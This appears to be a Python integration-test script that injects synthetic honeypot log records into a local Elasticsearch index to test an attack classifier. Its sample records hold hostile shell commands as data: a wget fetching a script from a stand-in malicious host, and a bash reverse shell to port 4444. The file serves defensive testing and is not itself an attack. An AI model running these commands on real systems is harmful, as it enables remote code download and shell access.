"""Inject synthetic T-Pot-shaped documents into a local ES for ml-classifier testing.

Each doc mirrors the schema produced by T-Pot's logstash filter:
  type, src_ip, dest_ip, dest_port, protocol, eventid, command, login_attempts,
  @timestamp ...

Usage:
  python integration-tests/inject_sample_docs.py [--count 50] [--host http://127.0.0.1:9200]
"""
from __future__ import annotations

import argparse
import json
import random
import sys
import urllib.request
from datetime import datetime, timedelta, timezone


SAMPLES = [
    # (label-we-expect, partial doc)
    ("Brute Force", {
        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.login.failed",
        "username": "root", "password": "123456", "login_attempts": 25,
        "src_ip": "203.0.113.10", "dest_port": 22,
    }),
    ("Recon", {
        "type": "ConPot", "protocol": "PORTSCAN", "eventid": "scan",
        "src_ip": "198.51.100.5", "dest_port": 502,
    }),
    ("Malware", {
        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.command.input",
        "input": "wget http://malicious.example.com/x.sh -O /tmp/x.sh",
        "src_ip": "203.0.113.55", "dest_port": 22,
    }),
    ("Intrusion", {
        "type": "Cowrie", "protocol": "ssh", "eventid": "cowrie.command.input",
        "input": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "src_ip": "203.0.113.99", "dest_port": 22,
    }),
    ("Etc", {
        "type": "Heralding", "protocol": "http", "eventid": "auth",
        "username": "admin", "password": "admin", "login_attempts": 1,
        "src_ip": "192.0.2.20", "dest_port": 80,
    }),
]


def post_bulk(host: str, body: str) -> dict:
    req = urllib.request.Request(
        f"{host}/_bulk",
        data=body.encode("utf-8"),
        headers={"Content-Type": "application/x-ndjson"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read())


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="http://127.0.0.1:19200")
    ap.add_argument("--count", type=int, default=50)
    args = ap.parse_args()

    today = datetime.now(timezone.utc)
    index = f"logstash-{today.strftime('%Y.%m.%d')}"

    lines = []
    for i in range(args.count):
        label, base = random.choice(SAMPLES)
        ts = today - timedelta(seconds=random.randint(0, 60))
        doc = dict(base)
        doc["@timestamp"] = ts.isoformat()
        doc["timestamp"] = doc["@timestamp"]
        doc["_expected_label"] = label  # for human verification, not used by classifier
        lines.append(json.dumps({"index": {"_index": index}}))
        lines.append(json.dumps(doc))

    body = "\n".join(lines) + "\n"
    resp = post_bulk(args.host, body)
    errors = resp.get("errors", False)
    n_ok = sum(1 for it in resp.get("items", []) if "index" in it and it["index"].get("status", 0) < 300)
    print(f"injected {n_ok}/{args.count} docs into {index}, errors={errors}")
    return 0 if not errors else 1


if __name__ == "__main__":
    sys.exit(main())
